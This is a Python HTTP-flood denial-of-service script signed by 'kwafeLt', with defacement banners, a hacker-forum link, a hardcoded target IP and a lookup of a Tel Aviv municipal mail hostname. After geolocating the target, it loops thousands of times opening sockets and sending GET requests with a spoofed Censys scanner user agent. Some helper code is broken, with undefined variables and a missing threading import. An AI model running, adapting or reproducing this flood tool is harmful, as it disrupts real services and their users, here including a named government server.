#!/usr/bin/env python3
#
import datetime, os, platform, socket, sys, uuid
import hashlib, json, requests, time #threading
from threading import Timer
#
hello = """
                                                                  
        .uef^"                                                        
      :d88E                      u.    u.      u.    u.               
      `888E             u      x@88k u@88c.  x@88k u@88c.       u     
       888E .z8k     us888u.  ^"8888""8888" ^"8888""8888"    us888u.  
       888E~?888L .@88 "8888"   8888  888R    8888  888R  .@88 "8888" 
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888    8888  888R    8888  888R  9888  9888  
       888E  888E 9888  9888   "*88*" 8888"  "*88*" 8888" 9888  9888  
      m888N= 888> "888*""888"    ""   'Y"      ""   'Y"   "888*""888" 
       `Y"   888   ^Y"   ^Y'                               ^Y"   ^Y'  
            J88"                                                      
            @%                                                        
          :"
          
"""
w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
w3 = '\thttps://www.instagram.com/kwafelt/?'

Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80';
ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)';
user_agent = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'

station = socket.gethostname(); address = socket.gethostbyname(station);
hostnme = os.uname()[0]; usernme = os.environ.get('USERNAME');
admin = os.getlogin(); admin = str(admin).replace('K','k').replace('l','L');
MAC = hex(uuid.getnode()); proxy = 'search.censys.io'; slEEp = 0.75;
#

def dev():
 data = 'mail.tel-aviv.gov.il'
 print(socket.gethostbyname(data))

TARGET_IP = '80.179.151.134'; TARGET_PORT = 443; status = 'dorman';
#
workstation = "Hanna Sofea's comrade"; v4L = f'{admin} wAS hERE';
inject = 'Injecting process'; question = 'Do you want to continue ?';
confirm = 'Is this ok?';
# parse_input
script = sys.argv[0]; target = None; port = None;
txt1 = None; num_requests = 0; thread_num = 0;
# scratch.py
#
def client(init): # platform
 client_os = platform.system(); un = platform.uname();
 client_hn = platform.node(); # hostname
 if (init == 'os'): return client_os;
 if (init == 'hn'): return client_hn;

def rgb(r,g,b,text):
 return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);

def cli(init):
 if init == 'start': terminal_title = f'{workstation} \ {v4L}';
 if init == 'prcss': terminal_title = f'{inject} \ {target}:{port} \ {v4L}';
 print(f'\33]0;{terminal_title}\a',end='',flush=True);

def h4sh(txt):
 str2hash = txt; result = hashlib.md5(str2hash.encode());
 digest = result.hexdigest(); return digest

def address(LAN):
 if LAN == 0:
  hostname = socket.gethostname() # getting the IP address using socket.gethostbyname() method
  ip_address = socket.gethostbyname(hostname) # getting the IP address using socket.gethostbyname() method
  addr = ip_address # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
 if LAN == 1:
  wifi = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  wifi.connect((remote_server,80)) # 443
  addr = wifi.getsockname()[0]
 return addr
###############################################################################

def t1m3r(init): Timer(init,parse).start();
def reset(init):
 os.system('setterm --foreground default --background default --cursor on');
 if (init == 1):
  sys.stdout.write(f'\r\n STOPPING python3 {script} {target} {port}\r\n');
  sys.stdout.flush(); sys.stdout.write(f'\r\n T3R1M4 K4S3H ~\r\n\n');
  sys.stdout.flush(); sys.exit(1);
def parse(init):
 if (len(sys.argv) == 3):
  global target; global port;
  target = sys.argv[1]; target = str(target); port = sys.argv[2];
  port = int(port); verif(init);
 else:
  sys.stdout.write(f'\r\n Usage: {sys.argv[0]} < TARGET_IP > < PORT >');
  sys.stdout.write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n');
  sys.stdout.flush(); reset(0); sys.exit(0); return False;
def verif(init):
 try:
  r = socket.gethostbyname(target); s = socket.create_connection((r, port), 2);
  start(init);
 except (IOError, OSError):
  txt = rgb(245,45,45,'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
  sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush(); sys.exit(0);

def ipapi(i):
 if (i == 0): URL = f'http://ip-api.com/json/'; #EDT https://ipinfo.io/json/1.1.1.1
 else: URL = f'http://ip-api.com/json/{target}';
 response = requests.get(URL); txt = json.loads(response.text); 
 tx1 = f"{rgb(245,245,245,txt['country'])} {rgb(227,10,92,txt['regionName'])} {rgb(0,110,210,txt['city'])} {rgb(245,245,245,txt['zip'])}";
 tx2 = f"\r\n {rgb(227,10,92,txt['isp'])}\n {rgb(0,110,210,txt['query'])}"
 out = tx1 + tx2
 return out

def start(init):
 os.system('setterm --foreground white --background red --cursor on');
 os.system('clear'); cli('start'); print(hello); accss('\taccess code');
def accss(text):
 reply = input('\n ' + text + '\t:\t');
 if reply == '2022':
  os.system('setterm --foreground cyan --background black --cursor on'); os.system('clear');
  tx1 = rgb(245,110,110,admin); tx2 = rgb(245,245,245,station); tx3 = rgb(245,110,110,MAC);
  tx4 = rgb(245,245,245,client('os')); tx5 = rgb(0,110,210,platform.release());
  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n'); sys.stdout.flush();
  
  sys.stdout.write(f'\r\n {ipapi(0)}\r\n'); sys.stdout.flush();
  txthere = rgb(245,215,0,f'wanna/will inject process to {target} : {port}')
  sys.stdout.write(f'\r\n {txthere}\r\n'); sys.stdout.flush();
  sys.stdout.write(f'\r\n {ipapi(1)}\r\n'); sys.stdout.flush();
  
  yes_or_no(question);
 else:
  accss('\ttry again');
def yes_or_no(question):
 reply = input(f'\r\n {rgb(0,245,0,question)} [y/N] ');
 if reply == '' or reply[0] == 'n':
  global txt; txt = 'CANCEL'; reset(0); os.system('clear'); return False;
 if reply[0] == 'y': press(0); return False;
 else: return yes_or_no('so.. YES or NO ?');
def yes_or_no_ORIG(question): # BROKEN
 reply = str(raw_input(question + ' [y/N] ')).lower().strip();
 if reply[0] == 'y': return True
 if reply[0] == 'n': return False
 else: return yes_or_no("Uhhhh... please enter ");
def press(init):
 os.system('setterm --cursor off'); os.system('clear'); cli('prcss');
 tx1 = datetim4(0); tx2 = f'{inject}..'; pst = print_status();
 pst.initial(tx1,tx2); process(15400);

###############################################################################

def datetim4(init):
 global waktu
 from datetime import datetime
 waktu = datetime.now(); # current date and time
 if init == 0:
  strTIME = waktu.strftime('%y/%m/%d %H:%M:%S')
 if init == 1:
  strTIME = waktu.strftime('%f')
 if init == 2:
  day_of_year = waktu.timetuple().tm_yday # day_of_year
  strTIME = day_of_year
 return strTIME
 return waktu

class print_status():
 def initial(self, time, txt1):
  tx1 = rgb(245,215,0,time); tx2 = rgb(99,99,99,'Initial');
  tx3 = rgb(255,215,0,txt1);
  sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r'); sys.stdout.flush();
 def success(self, time, txt1):
  tx1 = rgb(245,145,145,time); tx2 = rgb(0,110,210,'Success');
  tx3 = rgb(227,10,92,txt1); tx4 = rgb(245,245,245,v4L);
  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
 def timeout(self, time, txt1):
  tx1 = rgb(245,245,245,time); tx2 = rgb(255,215,0,'Timeout');
  tx3 = '> ERR_CONNECTION_TIMEOUT_ERR'; tx4 = rgb(0,110,210,'< RECONNECTING');
  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
 def failure(self, time, txt1):
  tx1 = rgb(145, 145, 145, time); tx2 = rgb(245, 110, 110, 'Failure');
  tx3 = rgb(255, 215, 0, 'No connection > server may be down');
  tx4 = rgb(245 , 245, 245, '< RECONNECTING');
  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
 flag = 'CTF{kwafeLt_wAS_hERE}';
###############################################################################
class att4ck():
 def default(self, txt, key):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
   try:
    address = (target, port); proc.connect(address); proc.settimeout(1);# saat
    proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {deact}\r\n').encode('ascii'), address);
    proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
    proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
    proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
    #
    #response = proc.recv(256); # 4096 #print('\r\n' + response.decode('ascii'))
    #
    proc.shutdown(socket.SHUT_RDWR); proc.close();
   except:
    pass



def attack(init):
 global slEEp; time.sleep(slEEp); time1 = datetim4(0); time2 = datetim4(1); hexd = h4sh(time2);
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
  try:
   address = (target, port); proc.connect(address); proc.settimeout(0.75);#saat
   proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {proxy}\r\n').encode('ascii'), address);
   proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
   proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
   proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
   #
   if (init == 'debug'): response = proc.recv(4096); print(f'\r\n' + response.decode('ascii'))
   # num = recv(s, addr_of_buffer, len_of_buffer, 0);
   #
   proc.shutdown(socket.SHUT_RDWR); proc.close();
   slEEp = 0.02; st = print_status(); st.success(time1,hexd)
  except socket.timeout:
   slEEp = 0.50; st = print_status(); st.timeout(time1,None)
  except socket.error:
   slEEp = 1.00; st = print_status(); st.failure(time1,None)
  except (KeyboardInterrupt, SystemExit): sys.exit(0);
  finally: pass;
 return slEEp;

def process(i):
 while (i < 54001):
  i += 1
  if (i == 54000):
   time.sleep(1.0); flag = 'DDoS{5h371x1}';
   tx1 = rgb(245,245,245,f'COMPLETED / ETA {i} / {flag} / FINN');
   sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); break
  else:
   try: attack(0); #Timer(slEEp,attack).start();
   except (KeyboardInterrupt, SystemExit):
    tx1 = rgb(245,245,245,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT');
    sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); sys.exit(0);
   finally: pass;

def process_b(i):
 for i in range(500):# 500
  time.sleep(slEEp); thread = threading.Thread(target=attack);
  thread.start(); # ..D.O.R.M.A.N..
 #else: print(f'\r\nD.O.R.M.A.N.\n')
###############################################################################
try: parse(0); txt = None;
except (KeyboardInterrupt, IOError, OSError):
 tx1 = rgb(245,245,245,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
 sys.stdout.write(f'\n {tx1}\r\n'); sys.stdout.flush(); sys.exit(0);
except SystemExit as EXIT: pass;
finally: reset(1); sys.exit(1);
##############################!TERIMA-KASEH~###################################
